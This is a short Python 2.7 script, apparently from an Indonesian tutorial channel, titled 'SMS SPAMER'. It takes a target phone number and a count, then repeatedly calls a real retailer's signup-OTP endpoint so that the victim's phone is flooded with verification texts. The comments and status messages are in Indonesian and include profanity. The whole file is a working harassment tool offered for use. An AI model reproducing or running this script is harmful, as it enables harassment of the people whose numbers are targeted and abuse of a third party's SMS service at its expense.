        # coding:utf8

# TUTORIAL : Kingtebe
# YOUTUBE  : Black-IT
# GITHUB   : https://github.com/KINGTEBE-404
# Python   : 2.7

import os,sys,json,time

try:
# Dimana Module requests belom di install
   import requests
except ImportError:
   print("\n [!] Silahkan install module requests")
   print("     ketik : pip2 install requests\n")
   sys.exit()


os.system('clear')

# banner
logo = """

        </> SMS SPAMER <\>

 [•] Author  : Channel Tutorials
 [•] Support : Black-IT
 [•] Github  : https://github.com/opoy1st
‹---------------------------------------------›
"""

print(logo)
# Penginputan Nomor Target
target = raw_input(" [•] Target : ")
# Penginputan Jumlah Spam
jumlah = raw_input(" [•] Jumlah : ")
print('')

req = requests.Session()

dat = {"phone":target}

for x in range(int(jumlah)):
        x = requests.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat)
        if 'ok' in x.text:
                print(" Sent To "+ target +" Sukses!! Anjir Bet dah!")
                time.sleep(3)
        else:
                print(" Sent To "+ target +" Gagal Jancok")
                time.sleep(3)
